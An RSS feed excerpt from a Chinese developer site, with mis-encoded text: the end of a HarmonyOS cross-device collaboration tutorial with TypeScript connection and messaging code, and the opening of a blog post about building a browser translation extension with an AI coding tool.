  <span class="hljs-attr">abilityName</span>: <span class="hljs-string">'EntryAbility'</span>,
  <span class="hljs-attr">serviceName</span>: <span class="hljs-string">'collabTest'</span> <span class="hljs-comment">// è‡ªå®šä¹‰æœåŠ¡åï¼Œä¸¤ç«¯è¦ä¸€è‡´</span>
};

<span class="hljs-comment">// è¿æ¥é…ç½®</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">connectOptions</span>: abilityConnectionManager.<span class="hljs-property">ConnectOptions</span> = {
  <span class="hljs-attr">needSendData</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">startOptions</span>: abilityConnectionManager.<span class="hljs-property">StartOptionParams</span>.<span class="hljs-property">START_IN_FOREGROUND</span>,
  <span class="hljs-attr">parameters</span>: { <span class="hljs-string">"newKey1"</span>: <span class="hljs-string">"value1"</span> }
};

<span class="hljs-comment">// å‘èµ·è¿æ¥</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">connectRemoteAbility</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> context = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getUIContext</span>().<span class="hljs-title function_">getHostContext</span>();
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// åˆ›å»ºä¼šè¯ï¼Œè·å–sessionId</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">sessionId</span> = abilityConnectionManager.<span class="hljs-title function_">createAbilityConnectionSession</span>(
      <span class="hljs-string">"collabTest"</span>, 
      context, 
      peerInfo, 
      connectOptions
    );
    hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">`åˆ›å»ºä¼šè¯æˆåŠŸï¼ŒsessionId: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.sessionId}</span>`</span>);
    
    <span class="hljs-comment">// å‘èµ·è¿æ¥ï¼ˆä¼šæ‹‰èµ·è®¾å¤‡Bçš„åº”ç”¨ï¼‰</span>
    <span class="hljs-keyword">const</span> connectResult = <span class="hljs-keyword">await</span> abilityConnectionManager.<span class="hljs-title function_">connect</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">sessionId</span>);
    <span class="hljs-keyword">if</span> (!connectResult.<span class="hljs-property">isConnected</span>) {
      hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'è¿æ¥å¤±è´¥'</span>);
      <span class="hljs-keyword">return</span>;
    }
    hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'è¿æ¥æˆåŠŸ'</span>);
  } <span class="hljs-keyword">catch</span> (error) {
    hilog.<span class="hljs-title function_">error</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">`è¿æ¥å¼‚å¸¸: <span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(error)}</span>`</span>);
  }
}
</code></pre>
<h5 data-id="heading-10">è®¾å¤‡Bï¼ˆæ¥æ”¶ç«¯ï¼‰ï¼šè¢«æ‹‰èµ·åæ¥å—è¿æ¥</h5>
<p>è®¾å¤‡Aå‘èµ·è¿æ¥åï¼Œè®¾å¤‡Bçš„åº”ç”¨ä¼šè¢«ååŒæ‹‰èµ·ï¼Œè§¦å‘<code>onCollaborate</code>ç”Ÿå‘½å‘¨æœŸå‡½æ•°ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EntryAbility</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">UIAbility</span> {
  <span class="hljs-title function_">onCreate</span>(<span class="hljs-attr">want</span>: <span class="hljs-title class_">Want</span>, <span class="hljs-attr">launchParam</span>: <span class="hljs-title class_">AbilityConstant</span>.<span class="hljs-property">LaunchParam</span>): <span class="hljs-built_in">void</span> {
    hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'åº”ç”¨å¯åŠ¨'</span>);
  }

  <span class="hljs-comment">// ååŒæ‹‰èµ·æ—¶è§¦å‘</span>
  <span class="hljs-title function_">onCollaborate</span>(<span class="hljs-attr">wantParam</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">Object</span>&gt;): <span class="hljs-title class_">AbilityConstant</span>.<span class="hljs-property">CollaborateResult</span> {
    hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'æ”¶åˆ°ååŒè¯·æ±‚'</span>);
    <span class="hljs-keyword">const</span> collabParam = wantParam[<span class="hljs-string">"ohos.extra.param.key.supportCollaborateIndex"</span>] <span class="hljs-keyword">as</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">Object</span>&gt;;
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleCollaborate</span>(collabParam);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
  }

  <span class="hljs-comment">// å¤„ç†ååŒè¿æ¥</span>
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">handleCollaborate</span>(<span class="hljs-params">collabParam: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">Object</span>&gt;</span>) {
    <span class="hljs-keyword">const</span> sessionId = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">createSessionFromParam</span>(collabParam);
    <span class="hljs-keyword">if</span> (sessionId === -<span class="hljs-number">1</span>) {
      hilog.<span class="hljs-title function_">error</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'ä¼šè¯åˆ›å»ºå¤±è´¥'</span>);
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// è·å–ååŒtokenï¼Œå¿…é¡»ä¼ å…¥acceptConnect</span>
    <span class="hljs-keyword">const</span> collabToken = collabParam[<span class="hljs-string">"ohos.dms.collabToken"</span>] <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>;
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> abilityConnectionManager.<span class="hljs-title function_">acceptConnect</span>(sessionId, collabToken);
      hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'æ¥å—è¿æ¥æˆåŠŸ'</span>);
      <span class="hljs-title class_">AppStorage</span>.<span class="hljs-title function_">setOrCreate</span>(<span class="hljs-string">'sessionId'</span>, sessionId);
    } <span class="hljs-keyword">catch</span> (error) {
      hilog.<span class="hljs-title function_">error</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">`æ¥å—è¿æ¥å¤±è´¥: <span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(error)}</span>`</span>);
    }
  }

  <span class="hljs-comment">// ä»ååŒå‚æ•°åˆ›å»ºä¼šè¯</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">createSessionFromParam</span>(<span class="hljs-attr">collabParam</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">Object</span>&gt;): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">let</span> sessionId = -<span class="hljs-number">1</span>;
    <span class="hljs-keyword">const</span> peerInfo = collabParam[<span class="hljs-string">"PeerInfo"</span>] <span class="hljs-keyword">as</span> abilityConnectionManager.<span class="hljs-property">PeerInfo</span>;
    <span class="hljs-keyword">const</span> connectOptions = collabParam[<span class="hljs-string">"ConnectOption"</span>] <span class="hljs-keyword">as</span> abilityConnectionManager.<span class="hljs-property">ConnectOptions</span>;

    <span class="hljs-keyword">if</span> (!peerInfo || !connectOptions) <span class="hljs-keyword">return</span> sessionId;

    <span class="hljs-comment">// é…ç½®æ•°æ®ä¼ è¾“èƒ½åŠ›</span>
    connectOptions.<span class="hljs-property">needSendData</span> = <span class="hljs-literal">true</span>;
    connectOptions.<span class="hljs-property">needSendStream</span> = <span class="hljs-literal">true</span>;

    <span class="hljs-keyword">try</span> {
      sessionId = abilityConnectionManager.<span class="hljs-title function_">createAbilityConnectionSession</span>(
        <span class="hljs-string">"collabTest"</span>, 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>, 
        peerInfo, 
        connectOptions
      );
    } <span class="hljs-keyword">catch</span> (error) {
      hilog.<span class="hljs-title function_">error</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">`åˆ›å»ºä¼šè¯å¤±è´¥: <span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(error)}</span>`</span>);
    }
    <span class="hljs-keyword">return</span> sessionId;
  }
}
</code></pre>
<h4 data-id="heading-11">4ã€ æ³¨å†Œäº‹ä»¶ç›‘å¬ï¼ˆä¸¤ç«¯éƒ½è¦åŠ ï¼‰</h4>
<p>è¿æ¥æˆåŠŸåï¼Œé€šè¿‡ç›‘å¬äº‹ä»¶è·å–è¿æ¥çŠ¶æ€å’Œæ¶ˆæ¯ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">registerEventListeners</span>(<span class="hljs-params">sessionId: <span class="hljs-built_in">number</span></span>) {
  <span class="hljs-comment">// ç›‘å¬è¿æ¥æˆåŠŸäº‹ä»¶</span>
  abilityConnectionManager.<span class="hljs-title function_">on</span>(<span class="hljs-string">"connect"</span>, sessionId, <span class="hljs-function">(<span class="hljs-params">callbackInfo</span>) =&gt;</span> {
    hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">`ä¼šè¯<span class="hljs-subst">${callbackInfo.sessionId}</span>è¿æ¥æˆåŠŸ`</span>);
  });

  <span class="hljs-comment">// ç›‘å¬æ–­å¼€è¿æ¥äº‹ä»¶</span>
  abilityConnectionManager.<span class="hljs-title function_">on</span>(<span class="hljs-string">"disconnect"</span>, sessionId, <span class="hljs-function">(<span class="hljs-params">callbackInfo</span>) =&gt;</span> {
    hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">`ä¼šè¯<span class="hljs-subst">${callbackInfo.sessionId}</span>å·²æ–­å¼€`</span>);
  });

  <span class="hljs-comment">// ç›‘å¬æ¥æ”¶æ¶ˆæ¯äº‹ä»¶</span>
  abilityConnectionManager.<span class="hljs-title function_">on</span>(<span class="hljs-string">"receiveMessage"</span>, sessionId, <span class="hljs-function">(<span class="hljs-params">callbackInfo</span>) =&gt;</span> {
    hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">`æ”¶åˆ°æ¶ˆæ¯: <span class="hljs-subst">${callbackInfo.message}</span>, ä¼šè¯ID: <span class="hljs-subst">${callbackInfo.sessionId}</span>`</span>);
    <span class="hljs-comment">// è¿™é‡Œå¯ä»¥å¤„ç†ä¸šåŠ¡é€»è¾‘ï¼Œæ¯”å¦‚æ›´æ–°UIæ˜¾ç¤ºæ¶ˆæ¯</span>
  });
}
</code></pre>
<h4 data-id="heading-12">5ã€ å‘é€æ¶ˆæ¯ï¼ˆä¸¤ç«¯éƒ½å¯å‘ï¼‰</h4>
<p>è¿æ¥æˆåŠŸåï¼Œç”¨<code>sendMessage</code>å‘é€æ–‡æœ¬ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">sendTestMessage</span>(<span class="hljs-params">sessionId: <span class="hljs-built_in">number</span></span>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">await</span> abilityConnectionManager.<span class="hljs-title function_">sendMessage</span>(sessionId, <span class="hljs-string">"è¿™æ˜¯æ¥è‡ªè®¾å¤‡Açš„æµ‹è¯•æ¶ˆæ¯"</span>);
    hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'æ¶ˆæ¯å‘é€æˆåŠŸ'</span>);
  } <span class="hljs-keyword">catch</span> (error) {
    hilog.<span class="hljs-title function_">error</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">`æ¶ˆæ¯å‘é€å¤±è´¥: <span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(error)}</span>`</span>);
  }
}
</code></pre>
<h4 data-id="heading-13">6ã€ ç»“æŸååŒï¼ˆå…³é”®ï¼é¿å…èµ„æºæ³„éœ²ï¼‰</h4>
<p>ä¸šåŠ¡å®Œæˆåä¸€å®šè¦æ–­å¼€è¿æ¥æˆ–é”€æ¯ä¼šè¯ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">endCollaboration</span>(<span class="hljs-params">sessionId: <span class="hljs-built_in">number</span></span>) {
  <span class="hljs-keyword">if</span> (sessionId === -<span class="hljs-number">1</span>) {
    hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'æ— æ•ˆçš„ä¼šè¯ID'</span>);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// çŸ­æœŸè¿˜éœ€ååŒï¼šåªæ–­å¼€è¿æ¥ï¼Œä¿ç•™sessionId</span>
  abilityConnectionManager.<span class="hljs-title function_">disconnect</span>(sessionId);
  hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'å·²æ–­å¼€è¿æ¥'</span>);

  <span class="hljs-comment">// é•¿æœŸä¸ç”¨ï¼šé”€æ¯ä¼šè¯ï¼ˆè‡ªåŠ¨æ–­å¼€è¿æ¥ï¼‰</span>
  abilityConnectionManager.<span class="hljs-title function_">destroyAbilityConnectionSession</span>(sessionId);
  hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'å·²é”€æ¯ä¼šè¯'</span>);
}
</code></pre>
<h3 data-id="heading-14">äº”ã€æ³¨æ„äº‹é¡¹ï¼š</h3>
<ol>
<li>ä»…æ”¯æŒAPI 18åŠä»¥ä¸Šç‰ˆæœ¬ï¼Œä¸”è®¾å¤‡å¿…é¡»ç™»å½•<strong>ç›¸åŒåä¸ºè´¦å·</strong></li>
<li>åªæœ‰<strong>ç›¸åŒbundleName</strong>çš„UIAbilityæ‰èƒ½ååŒï¼ˆæ¯”å¦‚éƒ½æ˜¯â€œcom.example.remotephotodemoâ€ï¼‰</li>
<li>ååŒç»“æŸåä¸€å®šè¦åŠæ—¶å…³é—­ï¼Œé”å±æˆ–é€€åå°5ç§’æœªç”³è¯·é•¿æ—¶ä»»åŠ¡ï¼ŒååŒä¼šè¢«ç³»ç»Ÿå¼ºåˆ¶ç»“æŸ</li>
<li>ä¼ è¾“éšç§æ•°æ®æ—¶ï¼Œè®°å¾—åŠ å¼¹æ¡†æé†’ç”¨æˆ·ï¼ˆç³»ç»Ÿä¸å®¡æŸ¥ä¼ è¾“å†…å®¹ï¼‰</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»æ²¡å†™è¿‡æµè§ˆå™¨æ’ä»¶ï¼Ÿæˆ‘ç”¨ TRAE SOLO 2 å°æ—¶å°±å®Œæˆäº†ä¸“å±ç¿»è¯‘å·¥å…·]]></title>    <link>https://juejin.cn/post/7576130618904608804</link>    <guid>https://juejin.cn/post/7576130618904608804</guid>    <pubDate>2025-11-24T13:51:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576130618904608804" data-draft-id="7576273949178331199" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»æ²¡å†™è¿‡æµè§ˆå™¨æ’ä»¶ï¼Ÿæˆ‘ç”¨ TRAE SOLO 2 å°æ—¶å°±å®Œæˆäº†ä¸“å±ç¿»è¯‘å·¥å…·"/> <meta itemprop="keywords" content="Trae,AIç¼–ç¨‹,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-11-24T13:51:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é£å“¥æ•°æ™ºè°ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/3825956195409223"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»æ²¡å†™è¿‡æµè§ˆå™¨æ’ä»¶ï¼Ÿæˆ‘ç”¨ TRAE SOLO 2 å°æ—¶å°±å®Œæˆäº†ä¸“å±ç¿»è¯‘å·¥å…·
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3825956195409223/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é£å“¥æ•°æ™ºè°ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T13:51:37.000Z" title="Mon Nov 24 2025 13:51:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ¯ä¸ªç¨‹åºå‘˜ä¼°è®¡éƒ½æœ‰è¿‡ï¼ŒæŠŠè‡ªå·±å¸¸ç”¨çš„è½¯ä»¶å…¨éƒ¨è‡ªè¡Œå®ç°ä¸€éçš„æƒ³æ³•ã€‚</p>
<p>å¬èµ·æ¥å¾ˆæå®¢ï¼Œä½†å®ç°èµ·æ¥çš„æ—¶é—´æˆæœ¬å¤ªé«˜äº†ã€‚</p>
<p>ä½†ç°åœ¨ä¸ä¸€æ ·äº†â€”â€”æœ‰äº† <code>TRAE SOLO</code>ï¼Œæˆ‘ä»¬åªè¦æè¿°æ¸…æ¥šæƒ³æ³•ï¼Œå°±å¯ä»¥<strong>ä¸€ç«™å¼å¿«é€Ÿæå®š</strong>ã€‚æˆ‘æ„Ÿè§‰è¿™ä¸ªäº‹æƒ…ï¼Œå¯ä»¥å†è¯•è¯•ã€‚</p>
<p>æ¯•ç«Ÿï¼Œä¸€ä¸ªä¸ªå®Œå…¨ç¬¦åˆè‡ªå·±åå¥½çš„å·¥å…·ï¼Œç”¨èµ·æ¥å¿ƒæƒ…éƒ½ä¼šå¥½ä¸Šä¸å°‘ã€‚</p>
<p>ä»Šå¤©ï¼Œæˆ‘ä»¬å°±ä»<strong>æµè§ˆå™¨ç¿»è¯‘æ’ä»¶</strong>å¼€å§‹~</p>
<h2 data-id="heading-0">é¡¹ç›®èƒŒæ™¯</h2>
<p>æµè§ˆå™¨ä¸­ç¿»è¯‘åº”è¯¥æ˜¯éå¸¸é«˜é¢‘çš„ä¸€ä¸ªåœºæ™¯ï¼Œä½†ä¹‹å‰çš„ç¿»è¯‘æ’ä»¶ä¸€ç›´éƒ½ä¸æ€ä¹ˆå¥½ç”¨ï¼Œç›´åˆ°æˆ‘äº†è§£åˆ°â€œæ²‰æµ¸å¼ç¿»è¯‘â€æ’ä»¶ã€‚</p>
<p>ä¸å¾—ä¸æ‰¿è®¤ï¼Œè¿™ä¸ªæ’ä»¶éå¸¸å¥½ç”¨ï¼Œåˆ†åˆ«åœ¨æ¯æ®µåŸæ–‡ä¸‹æ–¹æˆ–æ—è¾¹æ˜¾ç¤ºç¿»è¯‘å†…å®¹ï¼Œç›´è§‚ï¼Œå¯å¯¹ç…§ï¼Œæ”¯æŒç¿»è¯‘æ¥å£å’Œå„ç±»AIã€‚</p>
<p>ä½†å‰é˜µå­çš„å®‰å…¨äº‹ä»¶ï¼Œè®©æˆ‘æ„Ÿè§‰è¿˜æ˜¯è‡ªå·±é¼“æ£ä¸€ä¸ªå§ã€‚</p>
<h2 data-id="heading-1">åè¯è§£é‡Š</h2>
<p>å› ä¸ºæˆ‘ä¹‹å‰ä»æœªæœ‰è¿‡æµè§ˆå™¨æ’ä»¶å¼€å‘çš„ç»éªŒï¼Œå› æ­¤éœ€è¦æå‰äº†è§£ä¸‹ç›¸å…³æ¦‚å¿µã€‚</p>
<ul>
<li><strong>æµè§ˆå™¨æ’ä»¶</strong>ï¼šä¸€å¥—åŸºäºç½‘é¡µæŠ€æœ¯ï¼ˆHTML/CSS/JavaScriptï¼‰+ æµè§ˆå™¨æä¾›çš„æ‰©å±• API ç»„æˆçš„æ–‡ä»¶é›†åˆï¼ˆæœ€ç»ˆæ‰“åŒ…æˆ .crx/.xpi ç­‰æ ¼å¼ï¼‰ï¼Œè¿è¡Œåœ¨æµè§ˆå™¨çš„ â€œæ²™ç®±ç¯å¢ƒâ€ ä¸­ã€‚</li>
<li><strong>manifest.json</strong>ï¼š<strong>é‡ç‚¹ä¸­çš„é‡ç‚¹</strong>ï¼Œæ’ä»¶æ€»é…ç½®ï¼ŒåŒ…æ‹¬åç§°ã€æƒé™ã€åŠŸèƒ½æ¨¡å—ç­‰ã€‚</li>
<li><strong>popup.html</strong>ï¼šç‚¹å‡»æ’ä»¶å›¾æ ‡åå¼¹å‡ºçš„å°çª—å£ï¼Œæœ¬è´¨æ˜¯ä¸€ä¸ªè¿·ä½ ç½‘é¡µï¼Œæ”¯æŒæ‰€æœ‰ HTML è¯­æ³•ã€‚</li>
<li><strong>content scriptï¼ˆå¯é€‰ï¼‰</strong>ï¼šæ³¨å…¥åˆ°ç›®æ ‡ç½‘é¡µä¸­çš„ JS/CSSï¼Œèƒ½ç›´æ¥æ“ä½œç½‘é¡µ DOMï¼ˆæ¯”å¦‚ä¿®æ”¹ç½‘é¡µæ–‡å­—ã€éšè—å¹¿å‘Šï¼‰ï¼›</li>
<li><strong>background service workerï¼ˆå¯é€‰ï¼‰</strong>ï¼šæ’ä»¶çš„ â€œåå°æœåŠ¡â€ï¼Œå³ä½¿ popup å…³é—­ä¹Ÿèƒ½è¿è¡Œï¼Œç”¨äºç›‘å¬äº‹ä»¶æˆ–å‘èµ·è¯·æ±‚ã€‚</li>
<li><strong>Options</strong>ï¼šæ’ä»¶çš„ â€œè®¾ç½®é¢æ¿â€ï¼Œä¸“é—¨ç”¨æ¥è®©ç”¨æˆ·è‡ªå®šä¹‰æ’ä»¶åŠŸèƒ½çš„ç‹¬ç«‹é¡µé¢ï¼Œæ¯”å¦‚å¼€å…³åŠŸèƒ½ã€ä¿®æ”¹å‚æ•°ã€ä¿å­˜åå¥½è®¾ç½®ç­‰ã€‚</li>
</ul>
<h2 data-id="heading-2">å®æ“è®°å½•</h2>
<p>åŸºç¡€æ¦‚å¿µäº†è§£åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹äº†ã€‚</p>
<p>å¼€å‘è½¯ä»¶ä¾ç„¶æ˜¯ <code>TRAE SOLO</code>ï¼Œæœ¬æ¬¡æˆ‘ä»¬é€‰æ‹©äº† <code>SOLO Coder</code> æ™ºèƒ½ä½“ã€‚</p>
<h3 data-id="heading-3">å‰ç½®å‡†å¤‡</h3>
<p>ç¿»è¯‘å·¥ä½œï¼Œæˆ‘ä»¬ç›´æ¥é‡‡ç”¨å®Œå…¨å…è´¹çš„ <code>GLM-4.5-Flash</code> æ¨¡å‹ã€‚</p>
